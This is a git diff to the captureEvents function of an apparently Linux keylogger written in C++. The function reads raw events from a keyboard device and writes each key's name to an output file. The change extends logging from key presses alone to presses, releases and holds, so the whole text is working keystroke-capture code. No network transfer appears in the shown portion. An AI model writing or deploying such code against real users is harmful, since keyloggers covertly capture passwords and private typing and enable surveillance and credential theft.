@@ -187,20 +187,44 @@ void captureEvents(std::string &kbd_device){
         read(input_fd, &inputs, sizeof(inputs));
         
         // If input is not of a key type than ignore that 
-        if(inputs.type != EV_KEY) continue;
+        if(inputs.type != EV_KEY) continue;         
 
-        // Log only when key is perssed and ignore rest inputs
-        if(inputs.value != 1) continue;
+        // Key is released
+        if(inputs.value == 0){
+            auto it = keyMap.find(inputs.code);
+            if(it != keyMap.end()){
+                std::string result = "key released: " + it->second + "\n";
+                write(output_fd, result.c_str(), result.size());
+            }
+            else{
+                write(output_fd, "[UNKOWN]", 9);
+            }
+        }
 
-        // Searching the key code in keyMap
-        auto it = keyMap.find(inputs.code);
-        if(it != keyMap.end()){
-            // std::cout << it->second << std::endl;
-            write(output_fd, it->second.c_str(), it->second.size());
+        // Key is pressed
+        if(inputs.value == 1){
+            auto it = keyMap.find(inputs.code);
+            if(it != keyMap.end()){
+                std::string result = "key pressed: " + it->second + "\n";
+                write(output_fd, result.c_str(), result.size());
+            }
+            else{
+                write(output_fd, "[UNKOWN]", 9);
+            }
         }
-        else{
-            write(output_fd, "[UNKOWN]", 9);
+        
+        // Key is hold
+        if(inputs.value == 2){
+            auto it = keyMap.find(inputs.code);
+            if(it != keyMap.end()){
+                std::string result = "key hold: " + it->second + "\n";
+                write(output_fd, result.c_str(), result.size());
+            }
+            else{
+                write(output_fd, "[UNKOWN]", 9);
+            }
         }
+
 
     }
 
